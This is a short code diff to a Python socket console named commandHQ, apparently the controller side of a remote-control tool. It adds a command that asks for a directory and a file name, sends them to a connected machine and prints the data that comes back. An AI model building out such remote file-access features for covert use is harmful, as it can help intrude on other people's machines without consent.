@@ -188,6 +188,19 @@ def commandHQ():
                 ans = True
             except:
                 reload()
+                
+        if command == "10":
+            try:
+                directory = input(format + "Enter directory: ")
+                name = input(format + "Enter file name & extension: ")
+                
+                message = str(['sftd', directory, name])
+                message = message.encode()
+                
+                conn.send(message)
+                ans = True
+            except:
+                reload()
 
         if(ans == False): commandHQ()
 
@@ -222,6 +235,9 @@ def commandHQ():
                 print(format + "Data received: {}".format(incoming_message[1]))
                 
             if incoming_message[0] == "twcs": # 9
+                print(format + "Data received: {}".format(incoming_message[1]))
+                
+            if incoming_message[0] == "sftd": # 10
                 print(format + "Data received: {}".format(incoming_message[1]))
 
 clear()
